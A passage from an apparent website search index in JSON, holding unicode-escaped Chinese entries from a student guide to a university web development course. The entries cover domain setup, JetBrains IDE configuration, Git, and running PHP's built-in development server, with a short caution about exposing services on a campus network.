\u7684\u6587\u4ef6\u5939\uff0c\u6539\u52a8\u91cc\u9762\u7684\u4ee3\u7801\u4e4b\u540e\u518d\u5237\u65b0\u6d4f\u89c8\u5668\u5c31\u53ef\u4ee5\u4e86\u3002","title":"\u542f\u52a8"},{"location":"szu_courses/web/docker/#_4","text":"\u7a81\u7136\u53d1\u73b0\u6211\u5fd8\u8bb0\u63d0\u4e00\u4e0b\u8fd9\u4e2a\u73af\u8282\u4e86... \u4f60\u4e00\u5b9a\u4e0d\u60f3\u6bcf\u6b21\u8bbf\u95ee\u4f60\u7684\u7f51\u7ad9\u6216\u662f\u5411\u540c\u5b66\u5c55\uff08xuan\uff09\u793a\uff08yao\uff09\u90fd\u8981\u8f93\u4e00\u957f\u4e32IP\u5730\u5740\u5427\uff0c\u8fd9\u4e2a\u65f6\u5019\u8be5\u6765\u628a\u4e00\u4e2a\u57df\u540d\u89e3\u6790\u5230\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u4e86\u3002 \u6839\u636e\u4f60\u7684\u9700\u6c42\u548c\u7ecf\u6d4e\u6761\u4ef6\uff0c\u9009\u62e9\u4e00\u4e2a\u9002\u5408\u81ea\u5df1\u7684\u57df\u540d\u3002\u6258\u7ba1\u7f51\u7ad9\u6709\u5f88\u591a\uff0c \u963f\u91cc\u4e91 \u3001 \u817e\u8baf\u4e91 \u3001 GoDaddy \u3001 name.com \u7b49\u7b49\uff0c\u81ea\u884c\u9009\u62e9\u5373\u53ef\u3002\u4e70\u4e0b\u4e00\u4e2a\u57df\u540d\u540e\uff0c\u5c31\u53ef\u4ee5\u5230\u57df\u540d\u63a7\u5236\u53f0\u91cc\u6dfb\u52a0\u89e3\u6790\u8bb0\u5f55\u4e86\u3002\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u7740\u6dfb\u52a0\u4e00\u6761\u6307\u5411\u4f60\u7684\u670d\u52a1\u5668IP\u7684\u8bb0\u5f55\uff0c\u4e00\u65e6\u6dfb\u52a0\u6210\u529f\uff0c\u4f60\u5e94\u8be5\u5c31\u53ef\u4ee5\u901a\u8fc7\u57df\u540d\u6765\u8bbf\u95ee\u4f60\u7684\u670d\u52a1\u5668\u4e86\u3002 \u5728\u8fd9\u4e4b\u540e\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u7533\u8bf7\u514d\u8d39\u7684SSL\u8bc1\u4e66\uff0c\u6765\u5f00\u542f\u4f60\u7684\u7ad9\u70b9\u7684HTTPS\u8bbf\u95ee\u3002\u5e76\u4e14\uff0c\u4f60\u8fd8\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u4f7f\u7528 Cloudflare \u7684\u670d\u52a1\u6765\u4fdd\u62a4\u4f60\u7684\u7f51\u7ad9\u7684\u5b89\u5168\uff0c\u6216\u662f\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u964d\u4f4e\u4f60\u7684\u670d\u52a1\u5668\u7684\u538b\u529b\u3002","title":"\u57df\u540d\u89e3\u6790"},{"location":"szu_courses/web/first/","text":"\u8fd9\u8fb9\u8fd9\u4e9b\u5929\u6ca1\u7a7a \u6539\u5929\u518d\u586b\u8fd9\u4e2a\u5751","title":"\u524d\u8a00"},{"location":"szu_courses/web/tools/","text":"\u8fd8\u662f\u6765\u8ba8\u8bba\u4e00\u4e0b\u5f00\u53d1\u73af\u5883\u7684\u914d\u7f6e\u3002\u8fd9\u95e8\u8bfe\u7a0b\u5e94\u8be5\u4f1a\u63a8\u8350\u4f60\u4f7f\u7528HBuilder\u4f5c\u4e3a\u7f16\u8f91\u4ee3\u7801\u7684\u5de5\u5177\uff0c\u6211\u6ca1\u6709\u8fc7\u591a\u4e86\u89e3\uff0c\u57fa\u672c\u4e0a\u662f\u5e2e\u540c\u5b66debug\u7684\u65f6\u5019\u624d\u6709\u6240\u63a5\u89e6\u3002\u53e6\u5916\u53ef\u80fd\u8fd8\u4f1a\u63a8\u8350\u4f60\u4f7f\u7528XAMPP\u6765\u63d0\u4f9b\u5404\u79cd\u670d\u52a1\u3002 \u6211\u5728\u4fee\u8fd9\u95e8\u8bfe\u671f\u95f4\u5b8c\u5168\u6ca1\u6709\u4f7f\u7528\u4e0a\u8ff0\u8f6f\u4ef6\uff0c\u5728\u4e0b\u9762\u6211\u4f1a\u8bb2\u8ff0\u6211\u7684\u65b9\u6cd5\u3002\u6211\u4e0d\u4f1a\u53bb\u6bd4\u8f83\u4e24\u79cd\u65b9\u5f0f\u4f18\u52a3\u4e0e\u5426\uff0c\u6211\u59cb\u7ec8\u8ba4\u4e3a\u9002\u5408\u81ea\u5df1\u7684\u3001\u80fd\u63d0\u9ad8\u751f\u4ea7\u529b\u7684\u65b9\u6cd5\u624d\u662f\u4f18\u79c0\u7684\u3002\u554a\uff1f\u4f60\u8bf4\u6211\u662fJetBrains\u5bb6\u7684\u6b7b\u5fe0\uff0c\u53c8\u6765\u63a8\u9500\u4ed6\u5bb6\u7684IDE\uff1f\u5475\u5475\uff0c\u8981\u4e0d\u662fJetBrains\u7ed9\u5b66\u751f\u514d\u8d39\u7684\u6559\u80b2\u6388\u6743...\u6211\u65e9\u5c31...\u638f\u94b1\u4e70\u4ed6\u5bb6\u6b63\u7248\u5168\u5bb6\u6876\u4e86...\uff08\u8bf6\u8bf6\u6211\u64e6...\u522b\u6254\u7816\u5934...\uff09 \u5f00\u4e2a\u73a9\u7b11\uff0c\u8a00\u5f52\u6b63\u4f20\uff0c\u6211\u4eec\u6765\u770b\u770b\u600e\u4e48\u6109\u5feb\u5730\u73a9\u800d\uff1a IntelliJ IDEA Ultimate / PhpStorm \u4f60\u77e5\u9053\u5417\uff1fIDEA\u88c5\u4e0a\u76f8\u5e94\u7684\u63d2\u4ef6\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u6109\u5feb\u5730\u5f00\u53d1PHP\u3001Python\u7b49\u9879\u76ee\u800c\u4e0d\u518d\u9700\u8981\u5b89\u88c5PhpStorm\u3001PyCharm\u7b49\u5de5\u5177\u4e86\u3002\u867d\u7136\u6709\u4e9b\u529f\u80fd\u4e0d\u5728\u5b83\u539f\u6765\u7684\u4f4d\u7f6e\u4e0a\uff0c\u6216\u8005\u5176\u5b83\u4e00\u4e9b\u5c0f\u95ee\u9898\u53ef\u80fd\u9020\u6210\u4e00\u4e9b\u56f0\u6270\u3002 \u5982\u679c\u4f60\u672a\u6765\u5e76\u4e0d\u6253\u7b97\u4f7f\u7528IDEA\u6216\u8005\u4f60\u89c9\u5f97\u4f60\u6682\u65f6\u65e0\u6cd5\u9a7e\u9a6d\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u5148\u8003\u8651\u4f7f\u7528PhpStorm\u3002 PhpStorm = WebStorm + PHP + DB/SQL All the features in WebStorm are included into PhpStorm, with full-fledged support for PHP and Databases/SQL support added on top. PhpStorm: The Lightning-Smart IDE for PHP Programming by JetBrains \u7533\u8bf7\u5b66\u751f\u6388\u6743\u3001\u4e0b\u8f7d\u548c\u5b89\u88c5\u7684\u8fc7\u7a0b\u6211\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u5982\u679c\u4f60\u5728\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u65f6\u5df2\u7ecf\u7533\u8bf7\u6559\u80b2\u6388\u6743\u5219\u4e0d\u5fc5\u91cd\u590d\u7533\u8bf7\uff08\u5e9f\u8bdd\uff09\uff1b\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528JetBrains Toolbox\u7684\u8bdd\uff0c\u90a3\u4e48\u4f60\u7684\u4e0b\u8f7d\u5b89\u88c5\u5c06\u4f1a\u53d8\u5f97\u7279\u522b\u7b80\u5355\uff0c\u4ec5\u9700\u4e00\u952e\u5373\u53ef\u5b8c\u6210\uff08\u597d\u50cf\u4e5f\u662f\u5e9f\u8bdd\uff09\u3002 \u5916\u89c2\u548c\u7f16\u8f91\u5668 \u521d\u6b21\u542f\u52a8\u5373\u53ef\u9009\u62e9\u4e3b\u9898\uff0c\u5373\u4f7f\u4f60\u9519\u8fc7\u4e86\u5b83\uff0c\u4ecd\u7136\u53ef\u4ee5\u5728Settings->Appearance\u4e2d\u627e\u5230\u3002\u81f3\u4e8e\u4ee3\u7801\u7684\u989c\u8272\uff0c\u4f60\u53ef\u4ee5\u5728Settings->Editor->Color Scheme\u4e2d\u9009\u62e9\u4e00\u79cd\u4f60\u559c\u6b22\u7684\u3002\u66f4\u591a\u9009\u9879\u4f60\u53ef\u4ee5\u67e5\u9605\u5b98\u65b9\u6587\u6863\u3002\u53e6\u5916\uff0c\u6211\u6b63\u5728\u4f7f\u7528\u63d2\u4ef6Material Theme UI\uff0c\u5982\u679c\u4f60\u611f\u5174\u8da3\u7684\u8bdd\u4e0d\u59a8\u5b89\u88c5\u5c1d\u8bd5\u3002 LiveEdit\u63d2\u4ef6 \u5f53\u4f60\u521a\u5f00\u59cb\u5199\u7f51\u9875\u65f6\uff0c\u4f60\u53ef\u80fd\u538c\u5026\u4e86\u4e0d\u505c\u5730\u4fdd\u5b58\u5e76\u5207\u6362\u5230\u6d4f\u89c8\u5668\u5237\u65b0\u6765\u67e5\u770b\u5b9e\u9645\u7684\u6548\u679c\u3002\u4f60\u53ef\u4ee5\u5b89\u88c5LiveEdit\u63d2\u4ef6\u6765\u5e2e\u52a9\u4f60\uff0c\u5b83\u5c06\u4f1a\u81ea\u52a8\u5237\u65b0\u4f60\u7684\u7f51\u9875\u800c\u4e0d\u9700\u8981\u4f60\u624b\u52a8\u64cd\u4f5c\u3002\u5b89\u88c5\u7684\u65f6\u5019\u8bf7\u6ce8\u610f\u8fd8\u9700\u8981\u5728Chrome\u6d4f\u89c8\u5668\u4e0a\u5b89\u88c5JetBrains IDE Support\u63d2\u4ef6\u3002 \u5e38\u89c1\u95ee\u9898 \u6211\u5df2\u7ecf\u5b89\u88c5\u597d\u63d2\u4ef6\u4e86\uff0c\u5982\u4f55\u542f\u52a8\uff1f \u5f53\u4f60\u8fd8\u6ca1\u6709Run/Debug Configurations\u7684\u65f6\u5019\uff0c\u4e00\u4e2a\u6bd4\u8f83\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u53f3\u51fb\u6807\u7b7e\uff0c\u7136\u540e\u9009\u62e9Debug\uff0c\u8fd9\u5c06\u81ea\u52a8\u751f\u6210Configuration\uff0c\u5e76\u5f00\u542f\u4e00\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\u663e\u793a\u4f60\u7684\u7f51\u9875\u3002 \u9009\u62e9Debug\u540e\u751f\u6210\u4e86\u4e00\u4e2a\u7a7a\u767d\u7684\u6d4f\u89c8\u5668\u9875\u9762\uff1f \u8bf7\u786e\u8ba4Chrome\u6d4f\u89c8\u5668\u4e0a\u7684JetBrains IDE Support\u63d2\u4ef6\u662f\u5426\u5df2\u7ecf\u70b9\u4eae\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u8bf7\u91cd\u542fIDE\u548c\u6d4f\u89c8\u5668\uff1b\u5982\u679c\u5df2\u7ecf\u70b9\u4eae\uff0c\u8bf7\u5c06\u9f20\u6807\u79fb\u81f3\u63d2\u4ef6\u56fe\u6807\u4e0a\u68c0\u67e5\u5176\u8fde\u63a5\u76ee\u6807\u662f\u5426\u4e3a\u5f53\u524d\u4f7f\u7528\u7684IDE\u3002\u6b64\u5916\uff0c\u76ee\u524d\u6709\u63a5\u5230\u6848\u4f8b\uff0cIDE\u66f4\u65b0\u81f3\u6700\u65b0\u7248\uff0c\u4f46LiveEdit\u63d2\u4ef6\u5e76\u672a\u66f4\u65b0\u800c\u65e0\u6cd5\u8c03\u8bd5\uff0c\u66f4\u65b0\u63d2\u4ef6\u540e\u5373\u6062\u590d\u6b63\u5e38\u3002\u5982\u8fd8\u6709\u5176\u5b83\u95ee\u9898\uff0c\u53ef\u5728\u4e0b\u65b9\u8bc4\u8bba\u6216\u81ea\u884c\u641c\u7d22\u6216\u524d\u5f80\u793e\u533a\u5bfb\u6c42\u5e2e\u52a9\u3002 \u4e00\u4e9b\u5feb\u6377\u952e \u4f60\u53ef\u4ee5\u5728\u5b98\u65b9\u6587\u6863\u4e2d\u627e\u5230\uff0c\u4e5f\u53ef\u901a\u8fc7 Tip of the Day \u96f6\u6563\u5730\u5b66\u4e60\u3002\u521a\u5728CLion\u90a3\u7bc7\u91cc\u5199\u8fc7\u4e86\u4e00\u4e9b\u5feb\u6377\u952e\uff0c\u800c\u4e14\u5927\u90e8\u5206\u5e94\u8be5\u662f\u4e00\u6837\u7684\uff0c\u5b9e\u5728\u4e0d\u60f3\u518d\u91cd\u590d\u4e00\u904d\u4e86\uff0c\u6765\u8ba8\u8bba\u51e0\u4e2a\u5e38\u7528\u7684\u5c31\u597d\u3002 Ctrl+D \u76f4\u63a5\u590d\u5236\u4e00\u884c Clone Caret Above/Below \u4f60\u4e0d\u80fd\u6709\u5f88\u591a\u53ea\u624b\u6765\u5e2e\u4f60\u66f4\u5feb\u5730\u7f16\u8f91\u4ee3\u7801\uff0c\u4f46\u662f\u62e5\u6709\u591a\u4e2a\u5149\u6807\u540c\u65f6\u7f16\u8f91\u5374\u5f88\u5bb9\u6613\u3002\u8fd9\u4e2a\u5feb\u6377\u952e\u5728\u6211\u5f53\u524d\u7684\u73af\u5883\u4e0b\u4f3c\u4e4e\u5e76\u4e0d\u662f\u90a3\u4e48\u5bb9\u6613\u63cf\u8ff0\uff08Keymap: Default for KDE, IDEA 2018.3.4\uff09\uff0c\u4f60\u53ef\u4ee5 Double Ctrl \uff0c\u8bf7\u6ce8\u610f\uff0c\u7b2c\u4e8c\u6b21\u6309\u4e0bCtrl\u65f6\u8bf7\u4e0d\u8981\u653e\u5f00\uff0c\u5426\u5219\u5c06\u542f\u52a8Run Anything\uff0c\u540c\u65f6\u4f60\u9700\u8981\u6309\u4e0a/\u4e0b\u65b9\u5411\u952e\u6765\u4ea7\u751f\u591a\u4e2a\u5149\u6807\u3002\u5370\u8c61\u4e2d\uff0c\u67d0\u4e9b\u7248\u672c\u7684PhpStorm\u53ef\u4ee5\u6309\u4f4f Alt \u7136\u540e\u4f7f\u7528\u65b9\u5411\u952e\u6765\u4ea7\u751f\u591a\u4e2a\u5149\u6807\uff0c\u6216\u8005\u5728\u6309\u4f4f Alt \u7684\u65f6\u5019\u5728\u5e0c\u671b\u4ea7\u751f\u5149\u6807\u7684\u4f4d\u7f6e\u70b9\u6309\u9f20\u6807\u3002\u4e0d\u8fc7\u4e8b\u5b9e\u4e0a\u4f60\u4e5f\u53ef\u4ee5\u81ea\u7531\u5730\u6539\u53d8\u8fd9\u4e00\u5207\uff0c\u53ef\u4ee5\u5728Settings->Keymap\u4e2d\u627e\u5230\u5b83\uff0c\u7136\u540e\u8bbe\u7f6e\u4e00\u4e2a\u987a\u624b\u7684\u4e0d\u51b2\u7a81\u7684\u5feb\u6377\u952e\u3002 Shift+F6 \u91cd\u547d\u540d Ctrl+Shift+T \u4f7f\u4ee3\u7801\u5757\u88ab\u56f4\u7ed5 \u6211\u89c9\u5f97\u8fd9\u771f\u7684\u662f\u6211\u6700\u540e\u4e00\u6b21\u5e9f\u8bdd\u8fd9\u4e9b\u4e1c\u897f\u4e86... \u7248\u672c\u63a7\u5236 \u56fe\u5f62\u5316\u7684\u7248\u672c\u63a7\u5236\uff0c\u8981\u4e0d\u8981\uff1f \u5728\u5f00\u53d1\u4e00\u4e2a\u9879\u76ee\u7684\u65f6\u5019\uff0c\u901a\u5e38\u4f1a\u9700\u8981\u5229\u7528\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u6765\u7ba1\u7406\u8bf8\u591a\u7248\u672c\uff0c\u5177\u4f53\u7528\u9014\u548c\u4f18\u70b9\u6211\u5c31\u4e0d\u5728\u8fd9\u91cc\u778e\u626f\u4e86\uff0c\u6211\u5efa\u8bae\u4f60\u53bbGoogle\u4e00\u4e0bGit\u4e4b\u7c7b\u7684...\u6211\u4e0d\u5728\u8fd9\u91cc\u5e9f\u8bdd\u5e76\u4e0d\u4ee3\u8868\u7740\u4e0d\u91cd\u8981\u554a\uff0c\u8fd9\u4e2a\u8fd8\u662f\u6bd4\u8f83\u91cd\u8981\u7684\u3002 \u6211\u8fd9\u91cc\u5c31\u5047\u8bbe\u4f60\u57fa\u672c\u4e0a\u5df2\u7ecf\u77e5\u9053\u4e86Git\u6216\u8005\u5176\u4ed6\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u7684\u6700\u57fa\u7840\u7684\u4f7f\u7528\u65b9\u6cd5\u3002 \u65b0\u5efa\u4e00\u4e2a\u9879\u76ee\u65f6\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9\u5728\u4e91\u7aef\uff08\u4f8b\u5982GitHub\u3001BitBucket\u3001Azure DevOps\u7b49\u6258\u7ba1\u7f51\u7ad9\uff09\u65b0\u5efa\u4e00\u4e2arepository\uff0c\u7136\u540e\u5728\u672c\u5730 clone \u5e76\u6253\u5f00\u5b83\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7File->New->Project from Version Control...\u6765\u5b9e\u73b0\u3002\u5f53\u7136\uff0c\u5982\u679c\u4f60\u60f3\u57fa\u4e8e\u672c\u5730\u5df2\u7ecf\u5b58\u5728\u7684\u9879\u76ee\uff0c\u4f60\u53ef\u4ee5\u5728VCS->Git->Remotes...\u4e2d\u5c06\u4e91\u7aefrepo\u7684\u5730\u5740\u586b\u5165\u3002 \u5f53\u4f60\u5b8c\u6210\u4e86\u4e00\u4e9b\u4fee\u6539\u7684\u65f6\u5019\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u53f3\u4e0a\u89d2\u7684Commit\u6216\u662f\u5feb\u6377\u952e Ctrl+K \u6765 commit \u63d0\u4ea4\uff0c\u7136\u540e\u5728\u5f39\u51fa\u7684\u7a97\u53e3\u4e2d\u70b9\u51fb\u53f3\u4e0b\u65b9\u7684Commit and Push...\u5373\u53ef\u51c6\u5907\u5c06\u4fee\u6539 push \u63a8\u9001\u5230\u4e91\u7aef\u3002 \u5176\u5b83\u7684\u6211\u5c31\u4e0d\u591a\u5e9f\u8bdd\u4e86\uff0c\u5404\u4f4d\u81ea\u884c\u53d1\u6398\u5427\u3002 \u6570\u636e\u5e93 \u4f60\u53ef\u80fd\u5df2\u7ecf\u6ce8\u610f\u5230\u4e86IDE\u91cc\u7684 Database \uff0c\u6ca1\u9519\uff0c\u5b83\u53ef\u4ee5\u7ba1\u7406\u6570\u636e\u5e93\u3002\u70b9\u51fb\u52a0\u53f7\u6765\u6dfb\u52a0\u4e00\u4e2aData Source\uff0c\u9009\u62e9\u4f60\u6240\u4f7f\u7528\u7684\u5bf9\u5e94\u7684\u6570\u636e\u5e93\u670d\u52a1\u5668\uff0c\u7136\u540e\u586b\u5165\u76f8\u5173\u4fe1\u606f\u5c31\u53ef\u4ee5\u6d4b\u8bd5\u8fde\u63a5\u4e86\u3002 \u4e00\u65e6\u6210\u529f\u8fde\u63a5\uff0c\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u53ef\u89c6\u5316\u5730\u64cd\u4f5c\u6570\u636e\u5e93\u4e86\uff0c\u5e76\u4e14\u5b83\u53ef\u4ee5\u5e2e\u52a9\u4f60\u5199SQL\u8bed\u53e5\uff0c\u66f4\u597d\u7684\u5730\u65b9\u5728\u4e8e\u5b83\u8fd8\u53ef\u4ee5\u5728\u4f60\u5199\u540e\u53f0\u7a0b\u5e8f\u7684\u65f6\u5019\u63d0\u793a\u4f60\u6570\u636e\u5e93\u76f8\u5173\u7684\u4fe1\u606f\u3002 \u5173\u4e8e\u670d\u52a1 \u4f60\u5e94\u8be5\u5f88\u5feb\u4f1a\u53d1\u73b0\u8fd9\u79cd\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u6253\u5f00\u4f60\u7684\u7f51\u9875\u7684\u65b9\u5f0f\u4e0d\u80fd\u6ee1\u8db3\u4f60\u4e86\uff0c\u4f60\u4f1a\u5e0c\u671b\u6709\u540e\u7aef\u6765\u5904\u7406\u5404\u79cd\u4e8b\u52a1\uff0c\u6709\u6570\u636e\u5e93\u6765\u4fdd\u5b58\u5404\u7c7b\u6570\u636e...\u5173\u4e8e\u670d\u52a1\u5668\u7684\u65b9\u6848\uff0c\u4f60\u53ef\u80fd\u542c\u8bf4\u4e86\u5f88\u591a\uff0c\u6bd4\u5982\u8001\u5e08\u53ef\u80fd\u4f1a\u63a8\u8350\u4f60\u4f7f\u7528XAMPP\uff0c\u53c8\u5982\u4f60\u53ef\u80fd\u542c\u8bf4\u8fc7WAMP\uff0c\u4f46\u63a5\u4e0b\u6765\u6211\u4f1a\u4ecb\u7ecd\u4e00\u4e9b\u5b8c\u5168\u4e0d\u540c\u7684\u65b9\u6848\u3002 Danger \u4e0d\u7ba1\u4f60\u4f7f\u7528\u4f55\u79cd\u65b9\u5f0f\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5b89\u88c5\u5e76\u542f\u52a8\u4e0a\u9762\u7684\u670d\u52a1\u5168\u5bb6\u6876\uff08XAMPP\uff09\u3001\u8fd8\u662f\u6309\u7167\u4e0b\u9762\u7684\u8fc7\u7a0b\u9010\u4e00\u5b89\u88c5\u670d\u52a1\uff0c\u90fd\u662f\u628a\u4f60\u7684\u7535\u8111\u5f53\u6210\u670d\u52a1\u5668\u6765\u4f7f\u7528\u3002 \u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u5982\u679c\u4f60\u7684\u7535\u8111\u5904\u4e8e\u6821\u56ed\u7f51\u4e2d\u5e76\u4e14\u6ca1\u6709\u4e00\u5c42\u8def\u7531\u5668NAT\u4fdd\u62a4\uff0c\u5e76\u4e14\u4e5f\u6ca1\u6709\u5408\u7406\u5730\u914d\u7f6e\u9632\u706b\u5899\uff0c\u4f60\u6240\u5f00\u653e\u7684\u670d\u52a1\u53ef\u80fd\u88ab\u4ed6\u4eba\u8bbf\u95ee\u3002\u5982\u679c\u914d\u7f6e\u4e0d\u5f53\u6216\u662f\u7a0b\u5e8f\u5b58\u5728\u6f0f\u6d1e\uff0c\u8fd9\u5c06\u4f1a\u5e26\u6765\u4e25\u91cd\u7684\u95ee\u9898\uff0c\u4f8b\u5982\u4fe1\u606f\u6cc4\u6f0f\u6216\u751a\u81f3\u662f\u4e3b\u673a\u88ab\u63a7\u5236\u3002 Docker \u5f3a\u70c8\u63a8\u8350\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u7279\u522b\u662f\u90e8\u7f72\u4f60\u7684\u5e94\u7528\u7684\u65f6\u5019\u3002\u6211\u4f1a\u7279\u522b\u5730\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u4e2d\u63cf\u8ff0\u8fd9\u79cd\u65b9\u6cd5\u3002 PHP Built-in Web Server As of PHP 5.4.0, the CLI SAPI provides a built-in web server. -- Built-in Web Server, php.net \u6709\u5173\u5185\u7f6eWeb Server\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u8bbf\u95ee \u8fd9\u91cc \u3002 \u4e2a\u4eba\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a\u76f8\u5bf9\u7b80\u5355\u5f97\u591a\u7684\u65b9\u6848\uff0c\u7279\u522b\u662f\u4f60\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7IDE\u6765\u542f\u52a8\u670d\u52a1\u5668\u3002 Warning \u5b98\u65b9\u6587\u6863\u5df2\u7ecf\u6307\u51fa\uff0c\u5b83\u53ea\u5e94\u8be5\u7528\u4e8e\u5f00\u53d1\uff0c\u800c\u4e0d\u5e94\u5728\u5b9e\u9645\u751f\u4ea7\u73af\u5883\u4e2d\u4f7f\u7528\u3002 \u9996\u5148\u4f60\u5e94\u5148\u6709\u4e00\u4e2aPHP\u89e3\u91ca\u5668\uff0c\u5982\u679c\u8fd8\u6ca1\u6709\u5b89\u88c5\uff0c\u8bf7\u524d\u5f80 \u5b98\u7f51 \u4e0b\u8f7d\u3002\u8fd9\u91cc\u5c31\u5047\u8bbe\u4f60\u5df2\u7ecf\u90e8\u7f72\u597d\u4e86\u4f60\u7684PHP\u89e3\u91ca\u5668\uff0c\u4f60\u53ea\u9700\u8981\u5728Run/Debug Configurations\u91cc\u6dfb\u52a0\u4e00\u4e2a PHP Built-in Web Server \uff0c\u8bf7\u6ce8\u610f\u6307\u5b9a\u6839\u76ee\u5f55\u548c\u89e3\u91ca\u5668\uff0c \u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8bbe\u5b9a\u6839\u76ee\u5f55\uff1a \u540c\u7406\uff0c\u5982\u679c\u4e0b\u65b9\u51fa\u73b0\u8b66\u544a\u6307\u51fa\u672a\u6307\u5b9aPHP\u89e3\u91ca\u5668\uff0c\u4f60\u53ef\u4ee5\u70b9\u51fbFIX\u540e\u5728\u65b0\u7a97\u53e3\u4e2d\u8bbe\u7f6e\u597d\u3002\u53e6\u5916\uff0c\u4e5f\u8bf7\u7559\u610f\u4e00\u4e0b\u76d1\u542c\u5730\u5740\u3002 \u4fdd\u5b58\u540e\u70b9\u51fbRun\u5373\u53ef\u542f\u52a8Web\u670d\u52a1\u5668\uff0c\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee\u521a\u624d\u8bb0\u4f4f\u7684\u5730\u5740\u5373\u53ef\u3002 \u4f60\u5e94\u8be5\u53ef\u4ee5\u770b\u5230\u4f60\u5199\u597d\u7684index\uff0c\u5982\u679c\u4e0d\u662findex\uff0c\u8bf7\u8bb0\u5f97\u5728\u5730\u5740\u680f\u8f93\u5165\u4f60\u6240\u5e0c\u671b\u8bf7\u6c42\u7684\u6587\u4ef6\u540d\u3002 Tip \u8fd9\u4e2a\u65f6\u5019\u7684\u670d\u52a1\u5668\u662f\u53ea\u76d1\u542c\u672c\u673a\u8bf7\u6c42\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u4f1a\u53d7\u5230\u6765\u81ea\u5176\u4ed6\u4e3b\u673a\u7684\u653b\u51fb\u3002\u4e0d\u8fc7\uff0c\u5176\u4ed6\u4eba\u4e5f\u5c31\u65e0\u6cd5\u5728\u4ed6\u4eec\u7684\u7535\u8111\u4e0a\u76f4\u63a5\u8bbf\u95ee\u5e76\u67e5\u770b\u4f60\u7684\u6210\u679c\u4e86\u3002 \u5982\u679c\u4f60\u95ee\u6211\u6570\u636e\u5e93\u7684\u8bdd...\u5176\u5b9e\u8fd9\u4e2a\u4e0d\u662f\u7279\u522b\u91cd\u8981\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9MySQL\u3001MariaDB\u3001PostgreSQL\u7b49\u7b49\u4f17\u591a\u6570\u636e\u5e93\u7684Windows\u7248\u672c\uff0c\u6216\u8005\u5728\u5b50\u7cfb\u7edf\u4e0a\u5b89\u88c5\u3002\u968f\u540e\u4f60\u53ea\u8981\u542f\u52a8\u4e86\u670d\u52a1\u5668\uff0c\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7\u5ba2\u6237\u7aef\u6216\u662fPHP\u6765\u8bbf\u95ee\u4e86\u3002 \u8fd9\u91cc\u672c\u6765\u662f\u6253\u7b97\u5199\u5728\u5b50\u7cfb\u7edf\u4e0a\u5b89\u88c5\u670d\u52a1\u7684\uff0c\u4f46\u662f\u8003\u8651\u5230\u5b89\u5168\u6027\u4e4b\u7c7b\u7684\u8fd8\u662f\u5220\u6389\u4e86\u3002\u8fd8\u662f\u5efa\u8bae\u641e\u4e2a\u4e91\u4e3b\u673a\u6765\u8dd1Docker\uff0c\u4e0b\u4e00\u7bc7\u6162\u6162\u8bb2\u3002","title":"\u5de5\u6b32\u5584\u5176\u4e8b"},{"location":"szu_courses/web/tools/#intellij-idea-ultimate-phpstorm","text":"\u4f60\u77e5\u9053\u5417\uff1fIDEA\u88c5\u4e0a\u76f8\u5e94\u7684\u63d2\u4ef6\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u6109\u5feb\u5730\u5f00\u53d1PHP\u3001Python\u7b49\u9879\u76ee\u800c\u4e0d\u518d\u9700\u8981\u5b89\u88c5PhpStorm\u3001PyCharm\u7b49\u5de5\u5177\u4e86\u3002\u867d\u7136\u6709\u4e9b\u529f\u80fd\u4e0d\u5728\u5b83\u539f\u6765\u7684\u4f4d\u7f6e\u4e0a\uff0c\u6216\u8005\u5176\u5b83\u4e00\u4e9b\u5c0f\u95ee\u9898\u53ef\u80fd\u9020\u6210\u4e00\u4e9b\u56f0\u6270\u3002 \u5982\u679c\u4f60\u672a\u6765\u5e76\u4e0d\u6253\u7b97\u4f7f\u7528IDEA\u6216\u8005\u4f60\u89c9\u5f97\u4f60\u6682\u65f6\u65e0\u6cd5\u9a7e\u9a6d\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u5148\u8003\u8651\u4f7f\u7528PhpStorm\u3002 PhpStorm = WebStorm + PHP + DB/SQL All the features in WebStorm are included into PhpStorm, with full-fledged support for PHP and Databases/SQL support added on top. PhpStorm: The Lightning-Smart IDE for PHP Programming by JetBrains \u7533\u8bf7\u5b66\u751f\u6388\u6743\u3001\u4e0b\u8f7d\u548c\u5b89\u88c5\u7684\u8fc7\u7a0b\u6211\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u5982\u679c\u4f60\u5728\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u65f6\u5df2\u7ecf\u7533\u8bf7\u6559\u80b2\u6388\u6743\u5219\u4e0d\u5fc5\u91cd\u590d\u7533\u8bf7\uff08\u5e9f\u8bdd\uff09\uff1b\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528JetBrains 